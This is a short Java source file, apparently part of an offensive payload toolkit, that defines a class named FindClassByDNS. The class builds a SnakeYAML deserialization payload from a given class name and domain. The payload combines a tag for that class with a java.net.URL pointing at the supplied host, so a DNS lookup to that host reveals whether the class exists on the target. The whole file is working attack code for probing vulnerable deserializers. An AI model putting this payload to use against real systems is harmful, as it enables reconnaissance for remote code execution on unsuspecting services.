package cn.butler.snakeyaml.payloads;

import cn.butler.payloads.ObjectPayload;

public class FindClassByDNS implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        String[] split = command.split("\\|");
        String className = split[0];
        String domain = split[1];
        String yamlPayload = String.format("{!!%s {}: 0,!!java.net.URL [\"http://%s/\"]: 1}",className,domain);
        return yamlPayload;
    }


    public static void main(final String[] args) throws Exception {
    }
}
